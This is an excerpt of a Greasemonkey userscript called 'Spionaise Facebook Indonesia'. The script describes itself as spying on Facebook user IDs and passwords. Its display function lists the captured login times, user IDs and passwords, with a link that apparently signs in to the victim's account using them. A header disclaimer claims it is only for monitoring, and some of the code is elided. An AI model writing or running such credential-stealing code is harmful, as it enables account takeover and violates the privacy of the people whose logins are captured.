// ==UserScript==
// @name           	Spionaise Facebook Indonesia by Rui Fujiwara
// @version 		2.0
// @namespace      	Spionaise
// @description    	Mengintai ID pengguna dan kata Kunci di Facebook
// @include        	http://*.facebook.com/*
// @include        	http:/facebook.com/*
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	Aplikasi ini dibuat untuk mengawasi bukan untuk menguasai akun facebook seseorang dan apabila terjadi hal-hal yang menjadikan kerugian pada pihak tertentu saya sebagai pembuat aplikasi ini tidak bertanggung jawab karena saya selaku produsen tidak membenarkan tindakan pencurian untuk motif kejahatan.
// ==/UserScript==


var title 				= "Spionaise Facebook Indonesia by Rui Fujiwara";
var version 			= "v1.1.1";
...
function display()
{
	...
	html += '<table cellspacing="0"><thead class="unselectable"><tr><th>Waktu Masuk</th><th>ID Pengguna</th><th>Kata Kunci</th><th>Akses </th></tr></thead>';
	html += '<tbody>';
	...
	for (i=0; i < array.length; i++)
	{
		...
		html += '<tr><td>'+date.toLocaleString()+'</td><td>'+subArray[1]+'</td><td>'+subArray[2]+'</td><td><a href="#" onClick="doTheBossanova(\''+subArray[1]+'\', \''+subArray[2]+'\')">Masuk &raquo;</a></td></tr>';
	}
